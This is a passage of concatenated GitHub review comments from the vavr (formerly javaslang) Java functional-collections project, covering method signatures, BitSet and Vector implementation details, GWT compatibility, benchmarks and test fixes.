Thanks, see #2141. also \n put(Tuple2<? extends K, U> entry, BiFunction<? super V, ? super U, ? extends V> merge)\n replace(K key, V oldValue, V newValue)\n replaceAll(BiFunction<? super K, ? super V, ? extends V> function)\n replaceValue(K key, V value)\n. > fixed.\nthank you!\n\nMaybe move to milestone vavr-0.9.2?\n\nthis PR adds new methods to the Traversable interface, so it can't be included to the minor release. thank you. > maybe move to milestone vavr-0.9.2\nthis PR adds new methods to the SortedMap interface, so it can't be included to the minor release. @mrt181 thanks for reporting. thank you. thank you. thank you. \n. > Gradle Wrapper - some projects don't like including gradle with the source\nI believe this is right way. Using wrapper will allow us to have the same (maybe latest) version of the gradle anywhere and not depend on the locally installed version (or even not have it). If we will use a wrapper, please add\ngroovy\ntask wrapper(type: Wrapper) {\n    gradleVersion = '4.3.1'\n}. capsule rocks\nTarget            Operation   Impl                         Params  Count            Score  \u00b1     Error    Unit  scala_persistent  capsule_persistent  pcollections_persistent  vavr_persistent\nHashSetBenchmark  Add         scala_persistent             100000      5            34.66  \u00b1     2.78%   ops/s                                0.82\u00d7                    1.90\u00d7            0.75\u00d7\nHashSetBenchmark  Add         capsule_persistent           100000      5            42.14  \u00b1     1.43%   ops/s            1.22\u00d7                                        2.31\u00d7            0.92\u00d7\nHashSetBenchmark  Add         pcollections_persistent      100000      5            18.28  \u00b1     2.78%   ops/s            0.53\u00d7               0.43\u00d7                                     0.40\u00d7\nHashSetBenchmark  Add         vavr_persistent              100000      5            46.01  \u00b1     5.09%   ops/s            1.33\u00d7               1.09\u00d7                    2.52\u00d7                 \nHashSetBenchmark  Iterate     scala_persistent             100000      5           616.02  \u00b1     3.82%   ops/s                                0.45\u00d7                    2.18\u00d7            1.45\u00d7\nHashSetBenchmark  Iterate     capsule_persistent           100000      5         1,373.15  \u00b1     3.16%   ops/s            2.23\u00d7                                        4.86\u00d7            3.23\u00d7\nHashSetBenchmark  Iterate     pcollections_persistent      100000      5           282.80  \u00b1     6.40%   ops/s            0.46\u00d7               0.21\u00d7                                     0.66\u00d7\nHashSetBenchmark  Iterate     vavr_persistent              100000      5           425.47  \u00b1     2.10%   ops/s            0.69\u00d7               0.31\u00d7                    1.50\u00d7. @danieldietrich knock-knock. thank you. thanks. @danieldietrich @NataliiaPrivezentseva it is compatible. Sorry, I posted a non-relevant link :( Here we use vavr.collection.Collections class but not implementation of java.util.Collections.\nBut all is OK, this test works fine, I checked it\n```java\npackage io.vavr.collection;\nimport com.google.gwt.junit.client.GWTTestCase;\npublic class CollTestGwt extends GWTTestCase {\npublic void testCollectionsIsEmpty() {\n    List<Integer> list = List.of(42);\n    assertFalse(Collections.isEmpty(list));\n}\n\n@Override\npublic String getModuleName() {\n    return \"TestModule\";\n}\n\n}\n``. I checked the new artifacts, it seems all is OK. thanks. @jlorenzen Theappendandprepend` methods were added and removed twice. It was a difficult decision, see the last discussion.. @valery1707 third one is \"testVavrIterator\", please fix :). > If you guys agree, I volunteer to help provide examples/documentation.\nSure, thanks. thanks. thank you. Also there is well-known error in Integer.signum(from - toInclusive) which produces a wrong result in case of from=Integer.MAX_VALUE and toInclusive=-666\njava\nassertThat(Stream.rangeBy(Integer.MAX_VALUE - 5, 100, -1)).isNotEmpty(); // pass\nassertThat(Stream.rangeBy(Integer.MAX_VALUE - 5, -100, -1)).isNotEmpty(); // fails. > Can we restart this build?\ndone. Stream.rangeClosed() :)\n. Of course you're right, shame on me :)\n. I believe it's all right here... we just continue searching in rear part of queue with start < 0\n. fixed in same commit\n. Yes, I watch closely your commits\n. It is not so important, but I prefer toMap and toSortedMap\n. Yes, I see, fixed.\nBut there is another error message when I do mvn test:\ntext\nFailed tests:   shouldHaveAConsistentTypeSystem(javaslang.TypeConsistencyTest): Unoverriden methods found. Check if this is ok and copy & paste the necessary lines into the TypeConsistencyTest.WHITELIST:\n. I prefer to change the signature :)\n. you're right\n. @danieldietrich  should we create new instance in this method?\n. But Iterator iterator() requires by TraversableOnes which we extends\n. :) I believe there is all OK with this PR now\n. yes, you're right\n. OK, but with this feature implementation will be a little more complicated\n. Unfortunately this produces compilation warning \nVarargs method could cause heap pollution from non-reifiable varargs parameter iterators\nand build fails. I'll change loop direction like in List.of()\n. thank you, but I'll use Iterator<Iterator<T>>\nsee this comment\n. Sorry, I forgot\n. great\n. ok\n. I need Vector.toHashArrayMappedTrie() method to be able to implement 99% of code in interface body. This hack is not so beautiful but very effective\n. No, I'll do it :)\n. It's public :)\n. What do you think about Vector.ofTrie()?\n. Well\n. this reduces the runtime by 50 times\n. by 600(!) times on travis-ci.org:\n12.904 sec -> 0.019 sec\n. This allows comparison between String and Vector\n. Maybe you're right and I should rewrite StringTest.assertThat() method if we don't need in this functionality outside of tests\n. This has remained since those times when the class was also named String :)\n. > In general there is another thing which comes to my mind. Instead of wrapping a sequence of chars, i.e. java.lang.String, we could wrap a sequence of arbitrary object, for example stored in Vector<?> back. This would flatMap allow to return a WrappedString. When a concrete String representation is needed, back.mkString() could be called. Example: replaceAll(regEx, Str) = back.mkString().replaceAll(regEx, Str).\nWe can store both CharSequence and Vector in Lazy wrappers.\n. Sorry, one of CharSequence or Vector\n. First of all I should to implement the remaining tests\n. @patrox I completely agree with you about performance. Vector is slower than CharSequence in any case\n. And another one: what about the long list of methods inherited from java.lang.String?\n. It would be nice to create issue with link to this note\n. :smile: \n. Of course :)\n. wow, I forgot to add @Test annotations to all pad tests :)\n. it's a good idea\n. javaslang.collection.Array backed by Object[] but not by T[] because of generic types. It is not possible in Java to create arrays like Tuple2<Integer,Integer>[]\n. > Wouldn't it be better to make back of type T[] and additionally provide factory methods to create typed, empty arrays of a specific size?\nNo, it's forbidden and will fails in runtime\nUpdated: (in case of types like Tuple2<Integer,Integer>)\n. But with Class<T> type as parameter it is possible...\n. I don't like to pass a Class<T> as a parameter because it will change the Array's methods signatures as compared with all the other\n. @danieldietrich this calls Object.equals() but not Iterator.equals() because of well known problem with Map.Entry generics\n. yes, it works! :)\n. This is important fix. It was surprise for me, but Object.equals() overrides and hides Iterator.equals() method. We should implement it in class but not in interface.\n. :sunglasses: \n. OK\n. agrrrhhh!!! :) now I changed checking to Iterator. You can fix it later as you wish :)\n. bravo!\n. we should instantiate of(1, 2, 3) twice because of Iterator behaviour\n. can be\n. you're right, looks better\n. no, I need to know length of elements\n. > Don't know if that is really better...\nI don't know too :) I believe it's unnecessary complication\n. Vector.ofAll(elements) and then for(...) { get(i) } is very expensive :(\n. mmm... I don't understand you :( We have java.lang.Iterable here as parameter.\n. java\n    @Test\n    public void vvv() {\n        TreeSet<Integer> t = TreeSet.ofAll(Iterator.of(1, 2, 3));\n        System.out.println(t);  //  TreeSet(B:2 B:1 B:3)\n    }\nIt seems all is OK...\n. Yep. In flatten() tests I use emptyMap() constructor which provides Map directly, instead of empty() which provides IntMap wrapper\n. :+1: \n. it was wrong in case of this.comparator != elements.comparator\n. that PR was very dangerous :smile: \n. this fails only if Queue created by Queue.empty().append(T).append(T)...\n. list.isEmpty()? :smile: \n. whooooooooops :)\n. {@code LinkedHashMap}\n. {@code TreeMap}\n. {@code TreeMap}\n. > static is fine! It makes clear that we do not depend on any (mutable) state\nExactly! And I believe there is no other defference\n. You're right.\nAnd we need more, MORE, MORE tests :smile: \n. I'm bad\n. Yep :smile: \n. yes, you're right\n. hmmm.... but we have t.startsWith(slice, p) inside. We can only move while(...) {...} from findSlice to main method\n. Here is the question: should we generate IntFunctionN, LongFunctionN etc. ?\n. filtered can't be empty, because unfiltered (original LeafList) size >= 2 \n. See code above\njava\nif (length <= back.length()) {\n    return this;\n}\nThis ensures that sb.length() != 0\n. t.length() >= slice.length() & !slice.isEmpty() checked before\n. final Object[] = ...\n. it can be lazy?\n. return of(sb);\nwe should return static instance EMPTY if n == 0\n. return trie.isEmpty() ? empty() : new Vector<>(trie);\n. and this annotation can be removed\n. Array::wrap() accept Object[] as parameter, so you can do this:\njava\nObject[] elements = new Object[nOrZero];\n. Yes, Array::ofAll(Iterable<? extends T> elements) is broken :)\n. java\nn = n < 0 ? 0 : n;\n:smile: \n. thanks @simonecarriero pointed this\n. Yep :)\n. I would suggest something like this:\n``` java\n        final java.util.List accumulator = new ArrayList<>();\n    accumulator.clear();\n    v1.forEach(accumulator::add);\n    assertThat(accumulator.size()).isEqualTo(1);\n    assertThat(accumulator.get(0)).isEqualTo(\"Eric Nelson\");\n\n    accumulator.clear();\n    v2.forEach(accumulator::add);\n    assertThat(accumulator.size()).isEqualTo(0);\n\n```\n. Hi Simone!\nI would made this check before \nfinal char[] chrs = ...\nto avoid instantiate empty char[]\n. please use brackets\njava\nif (elements.length == 0) {\n    return Iterator.empty();\n}\n. I believe now is enough to override it in TreeMapTest\n. I'm not sure about that...\nThis line can produce ClassCastException if Comparator do not check this.\n. but contains(Tuple2 element) not compiles because it override contains(Object element)\n. Yes. We can relax signatures or make unsafe cast, but not both.\nI don't like this PR, but I see no other possibility\n. @danieldietrich I know you don't like abstract classes in such context, but but here it simplifies the code\n. we can rename it to something else\n. I forgot to merge queues\n. Here we should use List in generic\n. You're right. I'll prepare another PR\n. @danieldietrich :cry: \n. I voted against the stack :)\n. I would keep it as is. This signature simplifies the code in some methods like distinctBy(Comparator<? super Tuple2> comparator)\n. Yes, thank you. I believe this.corresponds(that) should work\n. We should do it everywhere. Let's do it in separate issue :)\n. Great, it works\n. I mean everywhere in Javaslang. Not only in Multimap\n. OK for fields. But 'private' modifier for enum constructor is redundant\n. XOR is bad function for hashCode. For example, HAMT of 1000 integers all between 0 and 16 will also between 0 and 16.\n. let's change signature to \njava\nprivate static void padding(StringBuilder sb, Character element, int limit)\nto avoid creating new StringBuilder instance\n. no, this doens't work, sorry\n. this test fails\njava\nassertThat(empty().leftPadTo(1, 1)).isEqualTo(of(1));\nI believe if (length <= 1) should be removed\n. what do you think about this implementation?\njava\n    @Override\n    default Stream<T> leftPadTo(int length, T element) {\n        final int thisLen = length();\n        if (length <= thisLen) {\n            return this;\n        } else {\n            return Stream.ofAll(Iterator.continually(element).take(length - thisLen)).appendAll(this);\n        }\n    }\n. > Shall we make it explicit that these methods should be carefully used on Stream?\nwe can mention this in the javadoc of this method\n. children.foldLeft(...)\n. children.foldLeft(...) will be recursively (see current implementation of Tree.size() method)\n. > I will experiment with it, let's see what the performance is of both :)\nAlso Lazy requires 48 bytes per instance.\n. > the 48 bytes are just for the reference, not for the whole Lazy object, aren't they?\nIt is size of object. I believe that reference's size is smaller :)\n. Could you also change javadoc?\n. wow :+1: \n. done\n. done\n. In my prototype of javaslang-gwt from javaslang excluded concurrent package, conversion to/from java.util.Stream and reflection. It work :)\nNow I'm waiting for java.util.Stream support in GWT (a few days ago Spliterators has been added) and will make next attempt :)\n. all methods like this should return PriorityQueue<T> for properly chaining\n. I believe AbstractsQueue is a good idea, but can be done only in version 3.0.0 because of major change\n. some methods moved to parent class, so there is no doubt\n. \n. what about something like this\njava\nreturn ofAll(comparator, iterator().take(n))\n. I believe you should use iterator() instead of toList() here.\nThere is no difference in behavior but toList() doing unnecessary List.reverse() call\n. java\nreturn ofAll(comparator, iterator().takeUntil(predicate))\n. maybe I missed the discussion on this, but why you're leave commented dependency?\n. you're completely right, thank you\n. I forget to remove it and I forget to make this comment:\nWe know nothing about types <T1, T2, T3> so we can't return tuple of BitSets because we need two conversion functions of every unknown types.\n. see comment above\n. Both fromInt and toInt fields of AbstractBitSet should be serializable. For example, you can see that BitSetTest.Mapper is serializable class. If we change signatures from Function1 to Function these tests (I'll add them to BitSetTest) will fail\n``` java\n    @Test\n    public void shouldSerializeDeserializeNativeBitSet() {\n        final Object actual = deserialize(serialize(BitSet.of(1, 2, 3)));\n        final Object expected = BitSet.of(1, 2, 3);\n        assertThat(actual).isEqualTo(expected);\n    }\n@Test\npublic void shouldSerializeDeserializeEnumBitSet() {\n    final Object actual = deserialize(serialize(BitSet.withEnum(E.class).of(E.V1, E.V2)));\n    final Object expected = BitSet.withEnum(E.class).of(E.V1, E.V2);\n    assertThat(actual).isEqualTo(expected);\n}\n\n```\nOr we can introduce new SerializableFunction interface but I'm not sure this is good way\n. No, it's usual behavior, but we need to to check that Tuple2<TreeSet,TreeSet> corresponds to Tuple2<BitSet,BitSet> i.e. has same elements set. It's used when we check result of methods that returns something else than BitSet, for example unzip()\n. No, I mean that equals fails if objects are instances of different classes, but we should accept equality of BitSet and TreeSet. So we should use overridden IterableAssert<T> assertThat(Iterable<T> actual) (see above)\n. No, I would leave this as is. Collector::accumulator() method should be fast, because it called with each element of external collection. ArrayList::add is fast enough, but BitSet::add can be very slow for big length, its complexity is O(n).\n. > With #1295 we will change Iterator, it will not be Iterable any more, so we cannot use BitSet.ofAll(Iterator) in a future version.\nI see. But let's do it in future (milestone 3.0.0 I guess) and in own separate commit, m? :smile: \n. > Would this change if later we decide that negative indices mean indexing from the end\nI don't know, this is not the near future :smile: \n. yes, thank you for pointing this in BitSet's skeleton :smile: \n. Sorry, but I don't see any reason to wrap long[] to Array<Long> for now. Maybe in future, when (and if) BitSet.offset will be implemented... But now there is exactly one case when elements can be changed: the method copyExpand() which called just before changing BitSet (with the obligatory copying)\n. thanx :+1: \n. No. BitSet's empty instance depends from conversion functions\n. yep\n. > The advantage of Array would be that you could head, tail, drop, dropRight, take etc. in constant time, instead of linear, as it is currently.\nSo sad, but no, Array<Long> can't help us. For example, BitSet.of(1, 3, 80, 81, ...).tail() requires full-copy of its content anyway. The only good case if we have exactly one 1-bit in first non-empty word...\n. This method should override corresponding method in SortedSet:\njava\n    @Override\n    <T1, T2, T3> Tuple3<? extends SortedSet<T1>, ? extends SortedSet<T2>, ? extends SortedSet<T3>> \n    unzip3(Function<? super T, Tuple3<? extends T1, ? extends T2, ? extends T3>> unzipper);\nWe can't use BitSet here, so I decided it will be TreeSet\n. done\n. this was removed in #1335\n. Value is not necessarily a single value, see Value::isSingleValued()\n. Morning\n(please refresh page, PR is updated)\nWell, this is good question. If node will be backed by Tuple, we will obtain better performance in iteration along tuples. On other side we'll spend more memory. I'll investigate this idea, but now I would leave this as is\n. Yep :smile: \nLast iterator was simple and obvious, but used a lot (O(n)) of temporary objects\n. really?! :trollface: \n. > ok, then MAX_LEVELS is an upper bound, right?\nyes, just maximum value of tree depth\n\nwhy not set MAX_LEVELS to (Integer.SIZE / AbstractNode.SIZE + 1) + 1?\n\nhmmm... I see no difference, but I can do it\n. so cute :)\n. towards #1339 \n. towards #1339\n. this can be removed because of shouldNotRemoveAllNonMatchedElementsFromNonNil()\n. java\nelse {\n    assertThat(seq.removeAll(ignore -> false)).isSameAs(seq);\n}\n. you forget CharSeqTest\n. @paplorinc thank for your comments, but firstly we should decide something about AutoClosable (see Daniel's comment above). Maybe this PR will be closed ;)\n. > Now I'm waiting for java.util.Stream support in GWT\nyeaaahh\n. Function2 extends BiFunction, so use it please (like in Java8)\n. also here\n. I believe Tuple2<? extends K, U> is enough\n. We already have such hack, see TreeMap::map(BiFunction) for example\n. I think so.\nFor custom comparator we should create own methods with comparator as parameter\n. @danieldietrich we can change the package to something else (see javadoc below)\n. I don't know, I'll try\n. It works\n. it should be in own PR for simplicity review (just thought)\n. Thank you! I can't review this PR now (out of my console), but it seems it significantly shorter than prev\n. I like this idea!\n(So huge PR again)\n. K is comparable because K extends Comparable<? super K>. We can't use natural comparator here. I believe this is correct fix:\njava\nfinal Comparator<Tuple2<K, V>> comparator = new EntryComparator<>((Comparator<? super K> & Serializable) K::compareTo);\nRedBlackTree<Tuple2<K, V>> result = RedBlackTree.empty(comparator);\n. Hmmm...\nI looked inside Comparator.naturalOrder(), it seems that your solution also works :)\n. Javaslang accepts null elements as ordinary elements\n. Hi @ashrko619 \nWhat about For(List.range(startYear, endYear + 1), List.range(1, 13))? :)\n. It is very strange, because on my computer this\njava\n@Test\npublic void ashrko619() {\n    For(List.range(1, 6), List.range(10,12)).\n            yield((BiFunction<Integer, Integer, Tuple2>) Tuple::of).\n            forEach(System.out::println);\n}\nworks fine\n(1, 10)\n(1, 11)\n(2, 10)\n(2, 11)\n(3, 10)\n(3, 11)\n(4, 10)\n(4, 11)\n(5, 10)\n(5, 11)\n. please stop this flood\n. 22 :)\n. this help for to GWT-compiler\n. We have constant for maximum arity. Would you change this to i < N?\n. Dito\n. What about set1, set2, etc?\n. I believe this is bad idea for {length=1_000_000; beginIndex=300_000; endIndex=600_000}\nWith your changes two big loops will be executed (but only one in previous implementation)\n. Why Vector doesn't implement Serializable?\n. But now complexity is O(n)\n. > It was redundant, already defined in interface \u03bb extends Serializable.\n\nI could still leave it there if you think it's more readable, it just makes no difference to the compiler.\n\nThank you, it's OK for me.\nAnd second question: why Vector is not final now? I don't remember exactly, but this keyword very important here... /cc @danieldietrich \n. Two loops again :(\n. I would revert this back. It should be done deliberately, in place of code where it is needed. Somebody can make a mistake in the future because warnings switched off in whole class\n. This is redundant. If results.isEmpty() then we have empty singleton and can return results\n. Please, revert this. Too hard to read...\n. Here we have four (!) loops against one loop in previous implementation\n. I believe this code is enough\njava\npublic <U> Vector<U> map(Function<? super T, ? extends U> mapper) {\n    return ofAll(iterator().map(mapper));\n}\nMethod ofAll returns singleton if parameter is empty\n. This is more obvious code, thank you\n. :+1: \n. It is possible to rename this class to BMT and move outside of Vector with package visibility? Just thought\n. Can Vector.BRANCHING_BASE (and other BMT-related stuff) be moved to BMT?\n. I believe these 3 lines should be moved to BMT, it's his logic\n. here complexity is O(log(n)) with quite small constant, but not O(1) like you told, am I right?\n. Maybe last my comment :) BMT has package visibility, I believe this line should be removed (?)\n. Benchmark profile removed. To run performance benchmarks you should run static main() method in specific class. Memory consumption benchmarks starts with maven test automatically.\nAlso see #1413 \n. Let's call BitMappedTrie.ofAll(veryLongCollection).\nHere is the first copy loop, and in Arrays.grouped() is second one, without any changes of array between them.\n. this is GWT-incompatible\n. Yes, I believe this can improve performance on long source collections\n. OK\n. Object[].clone() is GWT-incompatible\n/cc @paplorinc \n. Something wrong with cast to (Comparator<> & Serializable), need to be investigated\n. In this case test fails with ClassCastException. And I don't know what the problem. I changed this to CharSeq.ofAll(Iterator.ofAll(chars)) (like other your comments)\n. GWT compiler requires this.\n. > ?\n? :smile: \nThis class is part of GWT, just copied to Javaslang to avoid additional dependency\n. yep\n. I'm not sure about this. \nIn fact I'm not sure that this method is useful in Java too :smile: \n. yes\n. This artifact must be build manually (see README.md)\n. To make them package visible\n. java.lang.reflect.Array is GWT-incompatible\n. > This is a backup plan (i.e. we could spell out every primitive), though I'm not even sure whether this would work/is necessary in Javascipt.\nIt seems you should create a lot of implementations like IntArray?\n\nwhat are your thoughts on the rest of the PRs?\n\nI'm very sorry, I can't find a few consecutive hours for review your previous PR :(\nI still doubt in the effectiveness of tail and head arrays in the Vector (because of significantly code complication), but benchmarks are more than convincing :)\n. If we change signature to \njava\nstatic <T1, T2> Tuple2<Iterator<? extends T1>, Iterator<? extends T2>> sequence2(Iterable<Tuple2<? extends T1, ? extends T2>> tuples)\nthen these methods can be lazy. Also toList() will be omitted.\n/cc @danieldietrich \n. > I don't know if these methods are used often in practice, haven't seen a use-case yet. So we should consider to remove them completely. Keep things simple! Less is more.\nSee this example\n. No, I believe \"withSet\" should mean \"with set\" :smile: \nMaybe we should add fourth method \njava\npublic static <V> Builder<V> withLinkedSet() {\n    return new Builder<>(ContainerType.SET, LinkedHashSet::empty);\n}\nbut I doubt it is useful. Anyway it should be in own PR\n. > Set is an interface, there is no \"default set\", returning HashSet would be as valid as a LinkedHashSet or even TreeSet.\nIf we promise to return just Set we can and should return HashSet because it faster than TreeSet and compact than LinkedHashSet\n\nBut I'm sure you know that, not sure where your hostility originates from.\nIf you find it offensive that I recommend modifications to your code, no problem I can circumvent it by simulating a multimap also (as done currently).\n\nThe second time you're blaming me that I did not do. It is not my code. Do what you want and leave me alone\n. Do you mean Traversable<V> defaultValue? No, Daniel is right.\nSee example:\n``` java\npublic interface Multimap {\n    // ...\n    Traversable getOrElse(K key, Traversable<? extends V> defaultValue);\n    Traversable getOrElse2(K key, Traversable defaultValue);\n    // ...\n}\npublic void example() {\n    List def = List.of(1);\n    Multimap> map = HashMultimap.withSeq().empty();\n    Traversable> r1 = map.getOrElse(1, def);   // OK\n    Traversable> r2 = map.getOrElse2(1, def);  // Wrong 2nd argument type\n    }\n``\n. Please use$genericsinstead ofT1, T2. just question: why you useSimpleEntrybut notSimpleImmutableEntry?\n.Tuple$i$intGenerics(edited)\n.Map.Entry$intGenerics(edited)\n. maybedelayis better thanduration. There is no reason to useAtomicBooleanhere in GWT, you can use any boolean holder, for exampleboolean[].\nAlso this can help you to remove guava-dependency injavaslang-gwtmodule.\n... and fix failed tests :)\n. why we still need in guava?\n. unused import\n. Where this class is used?\n. thank you\n. @danieldietrich please check this code.\nThis method removed instead of make it deprecated. Compiler says \"possible ambiguous with of(keyComparator, k1, v1, ..., k10, v10)\". The problem observed only with TreeMap and only in this line of code. I have no idea whats wrong\n.API.*Map(Objects...)removed because fortunately still not released\n. thank you, will fix this\n. I tried many times to avoid this step, but unsuccessful. Also I've never seen other solution for maven projects. When (and if) we will migrate to gradle all things will be simpler\n. please also removecodeservercommand fromjavaslang-gwt/README.md`\n. >  we will migrate to maven soon\nNooooooo....\n\n. Please check this situation: \nclass TreeMap has both methods of(Comparator, Objects...) and of(Comparator, k1, v1, ... , k10, v10).\nMy Java (it seems 101u too) fails at compilation phase.\n. Thank you. ~~Now I'm sure that something wrong in my DNA.~~ Will check it this evening\n. Comparable?\n. dito\n. fuuuuu.... ))\n. It was a big mistake to override assers* methods. They don't check ordering of iterables. It is sufficient for Map, but very dangerous for other cases.\n. > This is the reason we did not recognize a bug...\nNo, this bug was not recognized because of there was not test for it :) But we could not notice the bug in fold(), if it were\n. isn't ofEntries(j.u.Map.Entry<? extends K, ? extends V>... entries) unsafe?\n. @paplorinc thank you, apply(i) looks better than getOrElse(i, 0)\n. Thank you, I will do that\n. On my sight there is no difference between this solution and your proposal. My goal was to make tests passing only. \n. > it's weird to call a Queue list - though that's what the LinkedHashMap calls it also\nBy design this is list (i.e. linked map is map with list for ordering). But we use Queue here because of performance issues (unfortunately I don't remember exactly what kind of). I would leave it as is.\n. done. here we can't use this code:\njava\nif (isOrdered()) {\n    Comparator<T> comparator = ((Ordered<T>) this).comparator();\n    ...\n} else {\n   ...\n}\nbecause isOrdered() belongs to Traversable but not to Value. But Ordered combines PriorityQueue, SortedSet and SortedMap and should be useful. I would use own ListIterator implementation here, because delegate.toJavaList() is O(n) preprocessing and it can be avoided. hmmm... we can keep current and previous elements inside ListIterator. yes, sorry, I do not understand you the first time, you're right. I believe this is too small contribution to add @author annotation. Multimap::size is O(N). 42 is the best value ever!. This PR #513 shows that we should avoid ConcurrentHashMap\nAlso I believe we should keep recursive memoization if it possible\n. then we should use non-single operation solution inside sync block (if.. contains.. etc), or I'm wrong?. > maybe I should avoid the double locking and just put everything in a syncronized block :/\nit can be a good first step . > new WeakHashMap<>(); to avoid memory leaks?\nWhat about this scenario?\n```java\nFunction1, Tuple2> f;\nFunction1, Tuple2> mem = f.memoized();\nTuple2 keyInstance = Tuple.of(1, 2);\nTuple2 result = mem.apply(keyInstance);\n    //\n    //  hard work\n\nkeyInstance = null;\n    ///  hard work\n    ///\n\nTuple2 newInstance = Tuple.of(1, 2);\nTuple2 result2 = mem.apply(newInstance); // calculation again (?)\n```. not tested?. No, '?' fails at compilation stage. > maybe a matter of taste\nI also prefer default, will change this.\n/ too  many copy/paste in this PR :-) /. ~good point~. No, we have to cast in three places only, but Idea shows 33 usages of emptyMap().\nPR updated. also adds test to check that orElse() result is same as result of evaluating supplier in case of properly iterable type. yes, exactly like in TreeSet. @GwtIgnore. @danieldietrich let's leave existing extension. \nHere we just mark keyComparator() with @Deprecated annotation. no public API changed. also used by TreeMultimap. I believe this is wrong way. HAMT's implementations of equals() and hashCode() are more complex than usual (see HAMTTest::shouldEqualsIgnoreOrder() and #1823 #1815). This behavior is not checked in the HashMap and this is a bug in the tests. I'm afraid your solution will be rejected by tests.\nYes, IntMap and IntMultimap taken from hell. All tests belonging to the Map and Multimap should be rewritten without using these classes, but this is huge work.. Also please add shouldEqualsIgnoreOrder() test (which checks equals and hashCodemethods) toAbstractSetTest. ... and toAbstractMapTest. what do you think, does makes sense to create additional private method to check hashCode equality?. what about shuffling initial entries? :). also here: shuffle?. could you move this into${(i == 1 && !checked)branch to avoid a lot of unused imports?.@authorand@sincetags missed. should be modified to something likeTreeSet.ofAll(iterator().filter().map())to avoid creating temporaryBitSet. maybe this should be${assertThatThrownBy}. maybe we should check thatoldValue.equals(newValue)istrueand in this case do nothing (?).EMPTY.distinct()andSINGLETON.distinct()operations cost nothing. On other side, used algorithm requires length of source array at least 2, and we should check that result ofdistinct()operation is valid (to cover cases like [1,1,1,1...]). I would leave this as is.. Yes, I also thought about this. But as you say this is not obvious change, so let's do it (or not) in own PR/issue. knock on wood :smile: \nI added a short description.tail()is an expensive operation for certain collections. unnecessary stream. Maybe it is better to use other collection here (java.util.ArrayList`?) for better performance. > hmm but in the end we do return the list in case of success. So maybe it's better to create directly the right format rather than paying the conversion cost later? \nBut this will be one conversion vs. N updates. \n\nAlso note that I took Try.sequence as a model, it's done the same there; so if we change, we can change both.\n\nI believe that temporary internal mutable collections are the right way for a lot of vavr methods. @danieldietrich ?. > hopefully it's not too difficult to measure? \nThere is some benchmarks in vavr-benchmark module, we can try :) But note that vavr's Vector internally consists from T[] blocks and every change causes copying this block and change of all blocks tree. Could you add tests for CharSeq? Tests in AbstractSeqTest do not cover this collection. @chb0github we keep Vavr without dependencies on the third-part libraries. :smile: it doesn't matter, because vavr-gwt doesn't working now (caused by changes in FutureImpl). Seems we should keep both branches: master and, say, v.0.9.x. Every commit in master which is belongs to minor release should be cherry-picked immediately for obtain actual minor snapshot version.. I believe you should save this checking. This will be more concrete if you will throw an exception in the called method but not in its implementation. This also applies to other deprecated methods. There are many methods in Vavr where this rule is not respected, but I believe that it should. Please skip the maven-deploy-plugin for the vavr-jcstress module. See vavr-benchmark for example. I believe that replacing <artifactId>maven-install-plugin</artifactId> with <artifactId>maven-deploy-plugin</artifactId> should work. \nBTW, can the jcstress start in a phase different from install (I see your hint mvn clean install -Pjcstress)? Then we can skip maven-install-plugin too.. @nfekete ok, thanks, then we can skip both phases. isSameAs. isSameAs. isSameAs. isSameAs. \"elements elements\". * \"elements elements\"\n* right direction. It may be appropriate to keep all versions in a common gradle.properties file. At least for junit and assertj. This is not necessary if gradle.properties will be used. Our modules have the same names with artifacts, so there is no. It would be nice to delete the generated directories before each generator startup to be sure that the old generated files will not remain in the repository (test case: we can rename something in generator).\nAlso, can we keep the generated code in the src-gen folder for a while? This will reduce the changes in PR and help the reviewers. Just asking :). already added (see several rows below). this method will be removed, see #2187. Iterator. Iterator. @author Sebastian Zarnekow. @author Sebastian Zarnekow. I'm not sure that it is still important, but take into account comment about \"don't remove cast...\". @nfekete @danieldietrich please review.\nHere we should use A extends T to make it more convenient to use. ? extends T works fine in trivial cases like lambdas, but fails on more complex and frequently occurring cases. For example see IteratorTest.OptionSupplier. If it don't implement Supplier<Option<? extends Integer>>, a compilation error will be made. thanks, done. Not applicable to this PR, but it seems that we can do this in linear time. LinkedHashMap consists of two objects: List and HashMap. In fact, we should do two things here:\n maybe to remove n elements from HashMap and add n elements to HashMap. This can be done in linear time.\n maybe to remove n elements from List and add n elements to List. This also can be done in linear time. Something like this: list.filter(additional::contains).appendAll(additional)\n  . Yep, sorry :) Very old story.\n. It can be ambiguous with concat(Tuple1<T2> tuple) (in case if T2 not shown intentionally). What do you think about rename this method to add(T2) and keep others as concat(Tuple*<***>)?. java\n// fail\nTuple3<String, Boolean, Integer> testee3 =\n        Tuple.of(\"a\", true).concat(Tuple.of(1)).map3(third -> third._1);\n// compiles fine\nTuple3<String, Boolean, Integer> testee4 = \n        Tuple.of(\"a\", true).<Tuple1<Integer>>concat(Tuple.of(1)).map3(third -> third._1);. ",
    "johnmcclean": "FYI : The latest cyclops-javaslang module has a reactive-streams Publisher and Subscriber implementation for javaslang traversables (https://github.com/aol/cyclops/tree/master/cyclops-javaslang)\n. cyclops is really just a series of extensions for JDK 8. \nJavaslang is like an alternative, more functional, JDK. The same extensions (such as AnyM, for-comprehensions, reactive-streams support) can be applied to either, there should be no performance penalty for choosing Javaslang over the JDK (for example).\nJavaslang just doesn't need some of the extensions, because it has that functionality already (e.g. cyclops-functions), but some of the others could be migrated (for example the full async Streaming support in cyclops-streams) to cyclops-javaslang over the next few months.\nGradle is awesome, helps manage the build and dependencies. I much prefer building and managing lots of small independent projects to larger ones, where possible :)\n. Hi Daniel,\nThere are a couple of things in Cyclops, a relatively new project from Aol, which has a primary focus on interoperability across the different functional style libraries that are emerging, which might be helpful here.\nThis is still an evolving work in progress - there are a few interfaces that might be helpful for your analysis (either for ideas, reuse or for defining an interoperability standard).\nThe Monad interface wraps any Java Monad implementation, and makes some attempt to retain type information about the monad's type and the type it targets (i.e. both Stream<String> and String). This can be quite messy in practice. \nMonad source code\nThe AnyM class simplifies things by dropping the type information for the Monad being managed (i.e. it doesn't store Stream<String> just String).\nAnyM source code\nIn both cases the underlying managed monad instance can be accessed again via unwrap(), and it is possible to flatMap to any monad type, so in the case of AnyM it is always possible to extract a monad of a given type, in a type safe way.\nMonad operations are managed under the hood by 'Comprehenders' implementations of the Comprehender interface. These facilititate the existence of the Monad wrapping classes and for comprehensions.\nThe plan is to create modules in Cyclops for Javaslang that would define Comprehenders for any monads within Javaslang and offer conversion between Javaslang types (and functionaljava, jdk, Guava, TottallyLazy). There are prototypes for some of these conversions already - they could just as easily live  in Javaslang as Cyclops (perhaps it would be better?). \nWhat do you think?\n. @danieldietrich  @mperry  Thanks guys. When I started working on this the goal was to provide away to 